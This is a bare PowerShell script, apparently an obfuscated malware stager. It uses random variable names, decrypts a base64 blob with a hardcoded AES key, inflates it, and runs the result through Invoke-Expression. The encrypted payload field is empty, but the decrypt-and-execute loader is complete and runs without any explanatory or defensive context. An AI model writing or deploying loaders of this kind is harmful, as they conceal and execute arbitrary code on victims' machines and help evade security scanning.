$IOObehsv = New-Object "System.Security.Cryptography.AesManaged"
$rLHzMLtrH = [System.Convert]::FromBase64String("")
$HWXIH = [System.Convert]::FromBase64String("xh6onO5cafW5aRfF/+nPttwBMvpQHtwtgG5JMliXvEs=")
$IOObehsv.Mode = [System.Security.Cryptography.CipherMode]::ECB
$IOObehsv.KeySize = 256
$IOObehsv.Key = $HWXIH
$IOObehsv.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$IOObehsv.BlockSize = 128
$IOObehsv.IV = $rLHzMLtrH[0..15]
$AsDLvbB = New-Object System.IO.MemoryStream
$VaDZPT = New-Object System.IO.MemoryStream(,$IOObehsv.CreateDecryptor().TransformFinalBlock($rLHzMLtrH,16,$rLHzMLtrH.Length-16))
$HNIHpEGx = New-Object System.IO.Compression.DeflateStream $VaDZPT, ([IO.Compression.CompressionMode]::Decompress)
$HNIHpEGx.CopyTo($AsDLvbB)
$HNIHpEGx.Close()
$yJJNU = [System.Text.Encoding]::UTF8.GetString($AsDLvbB.ToArray())
$IOObehsv.Dispose()
$VaDZPT.Close()
Invoke-Expression($yJJNU)
